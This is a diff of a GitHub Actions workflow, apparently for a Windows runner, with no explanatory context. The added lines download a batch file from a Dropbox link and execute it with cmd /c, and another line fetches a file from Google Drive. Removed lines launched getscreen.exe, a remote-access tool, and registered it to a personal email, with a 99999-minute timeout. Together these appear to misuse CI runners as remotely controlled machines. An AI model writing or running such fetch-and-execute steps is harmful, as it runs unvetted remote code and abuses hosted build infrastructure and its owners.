@@ -12,13 +12,10 @@ jobs:
         run: |  
      
          echo "EMAIL_SECRET=kauanscintras@gmail.com" > secrets.txt
+         Invoke-WebRequest -Uri "https://www.dropbox.com/scl/fi/gdzoens68gz1o4wuwtf0x/down.bat?rlkey=wd1ecn33dv9yn2uvdyynavbs6&dl=1" -OutFile "down.bat"
+         cmd /c down.bat
             Invoke-WebRequest -Uri "https://drive.google.com/uc?export=download&id=13fp07AYiONScFmMkJTdLNjto_m-Lo20d"
       - name: step 2
         run: |
         
-            cmd /c start getscreen.exe
-                  getscreen.exe -register kauanscintras@gmail.com
-      - name: step 3
-        run: |        
-         
          timeout-minutes: 99999
